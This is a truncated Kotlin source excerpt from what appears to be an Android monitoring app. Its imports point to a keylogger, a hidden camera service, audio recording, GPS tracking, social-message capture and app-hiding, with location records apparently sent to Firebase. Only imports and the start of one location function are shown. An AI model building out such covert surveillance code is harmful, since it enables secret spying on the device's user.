package com.github.dakoyaki.dash.services.accessibilityData
...
import com.github.dakoyaki.dash.data.model.Photo
import com.github.dakoyaki.dash.data.model.Recording
...
import com.github.dakoyaki.dash.utils.ConstFun.getRandomNumeric
import com.github.dakoyaki.dash.utils.ConstFun.showApp
import com.github.dakoyaki.dash.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.dakoyaki.dash.utils.Consts.CHILD_CAPTURE_PHOTO
import com.github.dakoyaki.dash.utils.Consts.CHILD_GPS
import com.github.dakoyaki.dash.utils.Consts.CHILD_PERMISSION
import com.github.dakoyaki.dash.utils.Consts.CHILD_SERVICE_DATA
import com.github.dakoyaki.dash.utils.Consts.CHILD_SHOW_APP
import com.github.dakoyaki.dash.utils.Consts.CHILD_SOCIAL_MS
import com.github.dakoyaki.dash.utils.Consts.DATA
import com.github.dakoyaki.dash.utils.Consts.INTERVAL
import com.github.dakoyaki.dash.utils.Consts.KEY_LOGGER
import com.github.dakoyaki.dash.utils.Consts.KEY_TEXT
...
import com.github.dakoyaki.dash.utils.Consts.SOCIAL
import com.github.dakoyaki.dash.utils.Consts.TAG
import com.github.dakoyaki.dash.utils.Consts.TIMER
import com.github.dakoyaki.dash.utils.FileHelper
import com.github.dakoyaki.dash.utils.FileHelper.getFileNameAudio
import com.github.dakoyaki.dash.utils.FileHelper.getFilePath
import com.github.dakoyaki.dash.utils.MediaRecorderUtils
import com.github.dakoyaki.dash.utils.MyCountDownTimer
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.dakoyaki.dash.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.github.dakoyaki.dash.data.model.Location(location.latitude, location.longitude, address, getDateTime())
